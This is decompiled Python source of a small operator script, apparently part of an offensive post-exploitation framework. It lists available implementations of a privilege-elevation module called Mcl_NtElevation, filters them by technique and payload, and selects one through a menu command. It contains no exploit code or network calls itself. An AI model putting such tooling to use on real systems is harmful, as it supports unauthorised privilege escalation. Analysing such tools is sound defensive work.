# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Peel.py
import dsz
import dsz.lp
import dsz.script
import sys
import os
import xml
import xml.dom
import dsz.data
import dsz.menu
Payload = 'payload'
Tech = 'technique'
Force = 'force'
bShowOutput = True
bForce = False

def main():
    global bForce
    dsz.control.echo.Off()
    params = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_Peel.txt')
    if len(params) == 0:
        return False
    else:
        tech = None
        pay = None
        if Payload in params:
            pay = params[Payload][0].upper()
        if Tech in params:
            tech = params[Tech][0].upper()
        if Force in params:
            bForce = True
        _PrintTask('Looking for implementations of PEEL')
        if not dsz.cmd.Run('moduletoggle -list -system Mcl_NtElevation', dsz.RUN_FLAG_RECORD):
            _PrintFailure('Command failed')
            return False
        _PrintSuccess()
        _PrintTask('Parsing options')
        impls = dsz.cmd.data.Get('ModuleToggle::System::Implementation', dsz.TYPE_STRING)
        selected = dsz.cmd.data.Get('ModuleToggle::System::Selected', dsz.TYPE_STRING)[0]
        _PrintSuccess()
        try:
            impls.remove('FAIL')
        except:
            pass

        phase1 = list()
        for item in impls:
            if tech == None or item.upper().startswith(tech):
                phase1.append(item)

        phase2 = list()
        for item in phase1:
            if pay == None or item.upper().endswith(pay):
                phase2.append(item)

        if len(phase2) == 0:
            _PrintTask('Setting PEEL module')
            _PrintFailure('No matching modules')
            return False
        if len(phase2) == 1:
            return _SetImplementation(phase2[0])
        desired, index = dsz.menu.ExecuteSimpleMenu('Select PEEL implementation', phase2)
        if desired == None or desired == '':
            _PrintTask('Setting PEEL module')
            _PrintFailure('No module selected')
            return False
        return _SetImplementation(desired)
        return


def _SetImplementation(name):
    _PrintTask('Setting PEEL module to %s' % name)
    if not dsz.cmd.Run('moduletoggle -system Mcl_NtElevation -set %s' % name):
        _PrintFailure()
        return False
    _PrintSuccess()
    return True


def _PrintTask(task):
    if bShowOutput:
        dsz.ui.Echo(task)


def _PrintOutcome(bState, msg=None):
    if bState:
        _PrintSuccess(msg)
    else:
        _PrintFailure(msg)


def _PrintSuccess(msg=None):
    __PrintImpl('PASSED', msg, dsz.GOOD)


def _PrintFailure(msg=None):
    __PrintImpl('FAILED', msg, dsz.ERROR)


def __PrintImpl(msg, detail, type):
    if not bShowOutput:
        return
    else:
        if detail != None:
            dsz.ui.Echo('    %s (%s)' % (msg, detail), type)
        else:
            dsz.ui.Echo('    %s' % msg, type)
        return


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)